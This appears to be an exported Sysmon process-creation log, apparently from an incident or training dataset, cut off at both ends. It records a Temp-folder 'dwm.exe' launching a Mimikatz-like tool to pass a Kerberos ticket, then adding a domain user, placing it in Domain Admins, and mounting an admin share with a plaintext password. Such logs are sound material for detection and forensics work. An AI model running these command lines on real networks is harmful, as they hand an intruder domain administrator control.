ProcessGuid: {CC41BF7E-5326-5A01-0000-0010520C2300}
ProcessId: 1296
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:31:02,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:31:02.188
ProcessGuid: {CC41BF7E-5326-5A01-0000-0010C30E2300}
ProcessId: 4996
Image: C:\Windows\SysWOW64\net.exe"
情報,2019/11/07 15:31:02,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:31:02.103
ProcessGuid: {CC41BF7E-5326-5A01-0000-0010C30E2300}
ProcessId: 4996
Image: C:\Windows\SysWOW64\net.exe
CommandLine: net  use j: \\192.168.16.1\c$ h4ckp@ss /user:example.co.jp\machida.kanagawa
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=B160F4462A4728BEC8FA053B99709622A4B4DD20
ParentProcessGuid: {CC41BF7E-5326-5A01-0000-0010520C2300}
ParentProcessId: 1296
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""net use j: \\192.168.16.1\c$ h4ckp@ss /user:example.co.jp\machida.kanagawa"""
情報,2019/11/07 15:31:02,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:31:02.047
ProcessGuid: {CC41BF7E-5326-5A01-0000-0010CC0C2300}
ProcessId: 4152
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-5326-5A01-0000-0010520C2300}
ParentProcessId: 1296
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""net use j: \\192.168.16.1\c$ h4ckp@ss /user:example.co.jp\machida.kanagawa"""
情報,2019/11/07 15:31:02,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:31:02.040
ProcessGuid: {CC41BF7E-5326-5A01-0000-0010520C2300}
ProcessId: 1296
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""net use j: \\192.168.16.1\c$ h4ckp@ss /user:example.co.jp\machida.kanagawa""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:30:33,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:30:33.483
ProcessGuid: {CC41BF7E-52FE-5A01-0000-00105FA52200}
ProcessId: 3244
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:30:33,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:30:33.467
ProcessGuid: {CC41BF7E-52FE-5A01-0000-0010CBAF2200}
ProcessId: 5556
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:30:33,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:30:33.389
ProcessGuid: {CC41BF7E-52FF-5A01-0000-0010ADD02200}
ProcessId: 5748
Image: C:\Windows\System32\Macromed\Flash\FlashUtil_ActiveX.exe"
情報,2019/11/07 15:30:23,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:30:23.571
ProcessGuid: {CC41BF7E-52FF-5A01-0000-0010ADD02200}
ProcessId: 5748
Image: C:\Windows\System32\Macromed\Flash\FlashUtil_ActiveX.exe
CommandLine: ""C:\Windows\System32\Macromed\Flash\FlashUtil_ActiveX.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=7885A583868EA312E7F141E15B2BC45BF0086DB1
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:30:22,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:30:22.657
ProcessGuid: {CC41BF7E-52FE-5A01-0000-0010CBAF2200}
ProcessId: 5556
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:3244 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-52FE-5A01-0000-00105FA52200}
ParentProcessId: 3244
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:30:22,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:30:22.517
ProcessGuid: {CC41BF7E-52FE-5A01-0000-00105FA52200}
ProcessId: 3244
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:29:59,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:29:59.027
ProcessGuid: {CC41BF7E-52E6-5A01-0000-0010A19E2200}
ProcessId: 2228
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:29:59,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:29:59.027
ProcessGuid: {CC41BF7E-52E6-5A01-0000-0010309E2200}
ProcessId: 4640
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:29:59,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:29:59.027
ProcessGuid: {CC41BF7E-52E6-5A01-0000-0010A1A02200}
ProcessId: 2468
Image: C:\Windows\SysWOW64\net.exe"
情報,2019/11/07 15:29:59,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:29:59.027
ProcessGuid: {CC41BF7E-52E6-5A01-0000-0010A9A12200}
ProcessId: 4604
Image: C:\Windows\SysWOW64\net1.exe"
情報,2019/11/07 15:29:58,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:29:58.972
ProcessGuid: {CC41BF7E-52E6-5A01-0000-0010A9A12200}
ProcessId: 4604
Image: C:\Windows\SysWOW64\net1.exe
CommandLine: C:\Windows\system32\net1  groups ""Domain Admins"" machida.kanagawa /add /domain
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=382169595D5BBEB535C4575B3EC8CC7E5E933115
ParentProcessGuid: {CC41BF7E-52E6-5A01-0000-0010A1A02200}
ParentProcessId: 2468
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net  groups ""Domain Admins"" machida.kanagawa /add /domain"
情報,2019/11/07 15:29:58,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:29:58.960
ProcessGuid: {CC41BF7E-52E6-5A01-0000-0010A1A02200}
ProcessId: 2468
Image: C:\Windows\SysWOW64\net.exe
CommandLine: net  groups ""Domain Admins"" machida.kanagawa /add /domain
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=B160F4462A4728BEC8FA053B99709622A4B4DD20
ParentProcessGuid: {CC41BF7E-52E6-5A01-0000-0010309E2200}
ParentProcessId: 4640
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""net groups ""Domain Admins"" machida.kanagawa /add /domain"""
情報,2019/11/07 15:29:58,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:29:58.913
ProcessGuid: {CC41BF7E-52E6-5A01-0000-0010A19E2200}
ProcessId: 2228
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-52E6-5A01-0000-0010309E2200}
ParentProcessId: 4640
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""net groups ""Domain Admins"" machida.kanagawa /add /domain"""
情報,2019/11/07 15:29:58,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:29:58.908
ProcessGuid: {CC41BF7E-52E6-5A01-0000-0010309E2200}
ProcessId: 4640
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""net groups ""Domain Admins"" machida.kanagawa /add /domain""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:29:38,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:29:38.119
ProcessGuid: {CC41BF7E-52D1-5A01-0000-0010D3972200}
ProcessId: 4060
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:29:38,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:29:38.119
ProcessGuid: {CC41BF7E-52D1-5A01-0000-001062972200}
ProcessId: 3792
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:29:38,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:29:38.119
ProcessGuid: {CC41BF7E-52D1-5A01-0000-0010D5992200}
ProcessId: 4944
Image: C:\Windows\SysWOW64\net.exe"
情報,2019/11/07 15:29:38,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:29:38.119
ProcessGuid: {CC41BF7E-52D1-5A01-0000-00102C9B2200}
ProcessId: 3516
Image: C:\Windows\SysWOW64\net1.exe"
情報,2019/11/07 15:29:37,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:29:37.994
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:29:37,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:29:37.978
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:29:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:29:37.987
ProcessGuid: {CC41BF7E-52D1-5A01-0000-00102C9B2200}
ProcessId: 3516
Image: C:\Windows\SysWOW64\net1.exe
CommandLine: C:\Windows\system32\net1  user machida.kanagawa h4ckp@ss /add /domain
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=382169595D5BBEB535C4575B3EC8CC7E5E933115
ParentProcessGuid: {CC41BF7E-52D1-5A01-0000-0010D5992200}
ParentProcessId: 4944
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net  user machida.kanagawa h4ckp@ss /add /domain"
情報,2019/11/07 15:29:37,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:29:37.947
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:29:37,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:29:37.947
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:29:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:29:37.944
ProcessGuid: {CC41BF7E-52D1-5A01-0000-0010D5992200}
ProcessId: 4944
Image: C:\Windows\SysWOW64\net.exe
CommandLine: net  user machida.kanagawa h4ckp@ss /add /domain
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=B160F4462A4728BEC8FA053B99709622A4B4DD20
ParentProcessGuid: {CC41BF7E-52D1-5A01-0000-001062972200}
ParentProcessId: 3792
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""net user machida.kanagawa h4ckp@ss /add /domain"""
情報,2019/11/07 15:29:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:29:37.897
ProcessGuid: {CC41BF7E-52D1-5A01-0000-0010D3972200}
ProcessId: 4060
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-52D1-5A01-0000-001062972200}
ParentProcessId: 3792
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""net user machida.kanagawa h4ckp@ss /add /domain"""
情報,2019/11/07 15:29:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:29:37.891
ProcessGuid: {CC41BF7E-52D1-5A01-0000-001062972200}
ProcessId: 3792
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""net user machida.kanagawa h4ckp@ss /add /domain""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:29:05,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:29:05.976
ProcessGuid: {CC41BF7E-52B1-5A01-0000-001011842200}
ProcessId: 3700
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:29:05,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:29:05.924
ProcessGuid: {CC41BF7E-52B1-5A01-0000-001011842200}
ProcessId: 3700
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:28:51,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:28:51.006
ProcessGuid: {CC41BF7E-52A2-5A01-0000-001066662200}
ProcessId: 2176
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:28:50,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:28:50.924
ProcessGuid: {CC41BF7E-52A2-5A01-0000-001066662200}
ProcessId: 2176
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:28:46,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:28:46.724
ProcessGuid: {CC41BF7E-521D-5A01-0000-00107CDF2100}
ProcessId: 572
Image: C:\Windows\System32\SearchFilterHost.exe"
情報,2019/11/07 15:28:46,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:28:46.724
ProcessGuid: {CC41BF7E-521D-5A01-0000-00107CDD2100}
ProcessId: 6020
Image: C:\Windows\System32\SearchProtocolHost.exe"
情報,2019/11/07 15:28:35,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:28:35.551
ProcessGuid: {CC41BF7E-5288-5A01-0000-0010962A2200}
ProcessId: 4224
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:28:35,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:28:35.520
ProcessGuid: {CC41BF7E-5288-5A01-0000-001012352200}
ProcessId: 1892
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:28:31,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:28:31.817
ProcessGuid: {CC41BF7E-528F-5A01-0000-0010DA582200}
ProcessId: 2664
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:28:31,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:28:31.801
ProcessGuid: {CC41BF7E-528F-5A01-0000-00105F582200}
ProcessId: 5076
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:28:31,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:28:31.768
ProcessGuid: {CC41BF7E-528F-5A01-0000-0010DA582200}
ProcessId: 2664
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-528F-5A01-0000-00105F582200}
ParentProcessId: 5076
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""type C:\Intel\Logs\m.txt"""
情報,2019/11/07 15:28:31,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:28:31.756
ProcessGuid: {CC41BF7E-528F-5A01-0000-00105F582200}
ProcessId: 5076
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""type C:\Intel\Logs\m.txt""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:28:24,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:28:24.414
ProcessGuid: {CC41BF7E-5288-5A01-0000-001012352200}
ProcessId: 1892
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:4224 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-5288-5A01-0000-0010962A2200}
ParentProcessId: 4224
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:28:24,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:28:24.243
ProcessGuid: {CC41BF7E-5288-5A01-0000-0010962A2200}
ProcessId: 4224
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:27:58,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:27:58.767
ProcessGuid: {CC41BF7E-526E-5A01-0000-0010F1202200}
ProcessId: 5112
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:27:58,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:27:58.767
ProcessGuid: {CC41BF7E-526E-5A01-0000-001080202200}
ProcessId: 4768
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:27:58,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:27:58.767
ProcessGuid: {CC41BF7E-526E-5A01-0000-0010F3222200}
ProcessId: 6028
Image: C:\Intel\Logs\mz.exe"
情報,2019/11/07 15:27:58,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:27:58.749
ProcessGuid: {CC41BF7E-526E-5A01-0000-0010F3222200}
ProcessId: 6028
Image: C:\Intel\Logs\mz.exe
CommandLine: C:\Intel\Logs\mz.exe  ""kerberos::ptc TGT_maebashi.gunma@example.co.jp.ccache"" exit 
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=53796614833D7596FF9F6BFD59E55D668089A00F
ParentProcessGuid: {CC41BF7E-526E-5A01-0000-001080202200}
ParentProcessId: 4768
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::ptc TGT_maebashi.gunma@example.co.jp.ccache"" exit > C:\Intel\Logs\m.txt"""
情報,2019/11/07 15:27:58,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:27:58.701
ProcessGuid: {CC41BF7E-526E-5A01-0000-0010F1202200}
ProcessId: 5112
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-526E-5A01-0000-001080202200}
ParentProcessId: 4768
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::ptc TGT_maebashi.gunma@example.co.jp.ccache"" exit > C:\Intel\Logs\m.txt"""
情報,2019/11/07 15:27:58,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:27:58.696
ProcessGuid: {CC41BF7E-526E-5A01-0000-001080202200}
ProcessId: 4768
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::ptc TGT_maebashi.gunma@example.co.jp.ccache"" exit > C:\Intel\Logs\m.txt""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
